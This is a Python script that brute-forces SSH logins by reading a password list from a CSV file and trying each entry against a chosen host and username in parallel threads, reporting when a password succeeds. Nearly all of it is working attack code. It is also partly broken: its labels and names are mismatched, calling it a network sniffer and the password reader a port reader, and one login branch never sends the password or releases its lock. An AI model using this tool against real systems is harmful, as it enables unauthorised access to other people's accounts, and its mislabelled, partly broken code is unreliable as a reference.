#!/usr/bin/env python3
# encoding: utf-8

import pexpect
import time
import argparse
import csv
from threading import *
from pexpect import pxssh

maxConnections = 5
connectionLock = BoundedSemaphore(value=maxConnections)
Found = False
Fails = 0

PROMPT = ['# ', ', ', '>>> ', '> ', '\$ ']

def sendCommand(child, cmd):
    child.sendline(cmd)
    child.expect(PROMPT)
    print(child.before)


def connect(host, user, password, release, usePxssh=False):
    global Found
    global Fails

    if not bool(usePxssh):
        sshNewKey = 'Are you sure you want to continue connecting'
        connStr = 'ssh %s@%s' % (user, host)
        child = pexpect.spawn(connStr)
        ret = child.expect([pexpect.TIMEOUT, sshNewKey, '[P|p]assword:'])
        if ret == 0:
            print('[-] Error Connecting')
            return
        if ret == 1:
            child.sendline('yes')
            ret = child.expect([pexpect.TIMEOUT, '[P|p]assword:'])
            if ret == 0:
                print('[-] Error Connecting')
                return
            child.sendline(password)
            child.expect(PROMPT)
            return child
    else:
        try:
            s = pxssh.pxssh()
            s.login(host, user, password)
            print('[+] Password Found: %s' % password)
            Found = True
        except Exception as e:
            if 'read_nonblocking' in str(e):
                Fails += 1
                time.sleep(5)
                connect(host, user, password, False)
        finally:
            if release:
                connectionLock.release()


def readPortsFromCSV(path='SECRETSDICT.csv'):
    ports = []
    with open(path, newline='') as csvfile:
        payload = csv.reader(csvfile, delimiter='\r', quotechar='|')
        for row in payload:
            ports += row
    return ports


def main():
    parser = argparse.ArgumentParser(description='A network sniffer with nmap embedded')
    parser.add_argument('--host', help='Specify target host')
    parser.add_argument('--username', help='Specify username of target ssh')
    parser.add_argument('--keychain', help='Specify the keychain file')
    parser.add_argument('--pxssh', help='Use Pxssh as a ssh hack client')

    args = parser.parse_args()
    tgtHost = args.host
    tgtUsername = args.username
    tgtKeychainFile = args.keychain

    passwords = readPortsFromCSV(args.keychain) if args.keychain else readPortsFromCSV()
    for password in passwords:
        if Found:
            print('[+] Exiting: Password Found')
            exit(0)
        if Fails > 5:
            print('[!] Exiting: Too Many Socket Timeouts')
            exit(0)
        connectionLock.acquire()
        print('[-] Testing: %s' % str(password))
        t = Thread(target=connect, args=(tgtHost, tgtUsername, password, True, args.pxssh))
        child = t.start()


if __name__ == '__main__':
    main()
